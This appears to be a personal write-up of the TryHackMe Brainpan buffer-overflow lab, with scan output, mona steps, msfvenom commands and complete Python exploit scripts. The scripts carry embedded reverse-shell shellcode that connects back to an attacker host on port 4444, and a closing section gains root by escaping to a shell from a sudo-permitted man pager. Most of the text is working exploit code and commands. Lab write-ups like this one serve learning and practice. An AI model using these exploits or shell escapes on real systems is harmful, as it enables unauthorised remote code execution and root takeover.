#THM  #buffOverflow 

#### Nmap

```bash
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
```

* :10000/bin/brainpan.exe

#### Basic buffer overflow

```py
import socket  
  
ip = "127.0.0.1"  
port = 9999  
offset = 0  
overflow = "A" * offset  
retn = ""  
padding = ""  
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa.." (1000 bytes)  
postfix = ""  
buffer = overflow + retn + padding + payload + postfix  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
try:  
	 s.connect((ip, port))  
	 s.recv(1024)  
	 print("Sending evil buffer...")  
	 s.send(bytes(buffer + "\r\n", "latin-1"))  
	 print("Done!")  
except:  
 	print("Could not connect.")
 
 
[*] Exact match at offset 524
```

```
!mona bytearray -b "\x00" (exclude the null byte)
```

```
!mona compare -f C:\mona\brainpan\bytearray.bin
```

* bad chars : \x00

```
!mona jmp -r esp -cpb "\x00"

311712F3 => \xf3\x12\x17\x31
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.57.111 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py -v payload
```

```py
import socket  
  
ip = "127.0.0.1"  
port = 9999  
offset = 524  
overflow = b"A" * offset  
retn = b"\xf3\x12\x17\x31"  
padding = b"\x90"*16  
payload = b""  
payload += b"\xba\x40\x55\xd9\xcf\xda\xc9\xd9\x74\x24\xf4\x58"  
payload += b"\x29\xc9\xb1\x52\x31\x50\x12\x83\xe8\xfc\x03\x10"  
payload += b"\x5b\x3b\x3a\x6c\x8b\x39\xc5\x8c\x4c\x5e\x4f\x69"  
payload += b"\x7d\x5e\x2b\xfa\x2e\x6e\x3f\xae\xc2\x05\x6d\x5a"  
payload += b"\x50\x6b\xba\x6d\xd1\xc6\x9c\x40\xe2\x7b\xdc\xc3"  
payload += b"\x60\x86\x31\x23\x58\x49\x44\x22\x9d\xb4\xa5\x76"  
payload += b"\x76\xb2\x18\x66\xf3\x8e\xa0\x0d\x4f\x1e\xa1\xf2"  
payload += b"\x18\x21\x80\xa5\x13\x78\x02\x44\xf7\xf0\x0b\x5e"  
payload += b"\x14\x3c\xc5\xd5\xee\xca\xd4\x3f\x3f\x32\x7a\x7e"  
payload += b"\x8f\xc1\x82\x47\x28\x3a\xf1\xb1\x4a\xc7\x02\x06"  
payload += b"\x30\x13\x86\x9c\x92\xd0\x30\x78\x22\x34\xa6\x0b"  
payload += b"\x28\xf1\xac\x53\x2d\x04\x60\xe8\x49\x8d\x87\x3e"  
payload += b"\xd8\xd5\xa3\x9a\x80\x8e\xca\xbb\x6c\x60\xf2\xdb"  
payload += b"\xce\xdd\x56\x90\xe3\x0a\xeb\xfb\x6b\xfe\xc6\x03"  
payload += b"\x6c\x68\x50\x70\x5e\x37\xca\x1e\xd2\xb0\xd4\xd9"  
payload += b"\x15\xeb\xa1\x75\xe8\x14\xd2\x5c\x2f\x40\x82\xf6"  
payload += b"\x86\xe9\x49\x06\x26\x3c\xdd\x56\x88\xef\x9e\x06"  
payload += b"\x68\x40\x77\x4c\x67\xbf\x67\x6f\xad\xa8\x02\x8a"  
payload += b"\x26\xdd\xd9\xad\xd9\x89\xdf\xcd\x34\x16\x69\x2b"  
payload += b"\x5c\xb6\x3f\xe4\xc9\x2f\x1a\x7e\x6b\xaf\xb0\xfb"  
payload += b"\xab\x3b\x37\xfc\x62\xcc\x32\xee\x13\x3c\x09\x4c"  
payload += b"\xb5\x43\xa7\xf8\x59\xd1\x2c\xf8\x14\xca\xfa\xaf"  
payload += b"\x71\x3c\xf3\x25\x6c\x67\xad\x5b\x6d\xf1\x96\xdf"  
payload += b"\xaa\xc2\x19\xde\x3f\x7e\x3e\xf0\xf9\x7f\x7a\xa4"  
payload += b"\x55\xd6\xd4\x12\x10\x80\x96\xcc\xca\x7f\x71\x98"  
payload += b"\x8b\xb3\x42\xde\x93\x99\x34\x3e\x25\x74\x01\x41"  
payload += b"\x8a\x10\x85\x3a\xf6\x80\x6a\x91\xb2\xa1\x88\x33"  
payload += b"\xcf\x49\x15\xd6\x72\x14\xa6\x0d\xb0\x21\x25\xa7"  
payload += b"\x49\xd6\x35\xc2\x4c\x92\xf1\x3f\x3d\x8b\x97\x3f"  
payload += b"\x92\xac\xbd"  
  
buffer = overflow + retn + padding + payload  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
try:  
	 s.connect((ip, port))  
	 s.recv(1024)  
	 print("Sending evil buffer...")  
	 s.send(buffer + b"\r\n")  
	 print("Done!")  
except:  
 	print("Could not connect.")
	
	
Z:\home\puck>
```

* system is actually linux 

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.57.111 LPORT=4444 EXITFUNC=thread -b "\x00" -f py -v payload
```

```py
import socket  
  
ip = "10.10.143.201"  
port = 9999  
offset = 524  
overflow = b"A" * offset  
retn = b"\xf3\x12\x17\x31"  
padding = b"\x90"*16  
payload =  b""
payload += b"\xb8\x6e\xa4\xfc\x95\xdd\xc2\xd9\x74\x24\xf4\x5d"
payload += b"\x31\xc9\xb1\x12\x31\x45\x12\x83\xc5\x04\x03\x2b"
payload += b"\xaa\x1e\x60\x82\x69\x29\x68\xb7\xce\x85\x05\x35"
payload += b"\x58\xc8\x6a\x5f\x97\x8b\x18\xc6\x97\xb3\xd3\x78"
payload += b"\x9e\xb2\x12\x10\x2b\x4e\xdc\x8f\x43\x52\x1e\x5e"
payload += b"\xc8\xdb\xff\xd0\x96\x8b\xae\x43\xe4\x2f\xd8\x82"
payload += b"\xc7\xb0\x88\x2c\xb6\x9f\x5f\xc4\x2e\xcf\xb0\x76"
payload += b"\xc6\x86\x2c\x24\x4b\x10\x53\x78\x60\xef\x14"
buffer = overflow + retn + padding + payload  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
try:  
	s.connect((ip, port))  
	s.recv(1024)  
	print("Sending evil buffer...")  
	s.send(buffer + b"\r\n")  
	print("Done!")  
except:  
 	print("Could not connect.")
```

#### Priv Escalation

[Cheat sheet](https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
sudo -l

Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
	
	
sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
  
 
sudo /home/anansi/bin/anansi_util manual ls
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/bash
!/bin/bash
root@brainpan:/usr/share/man#
```

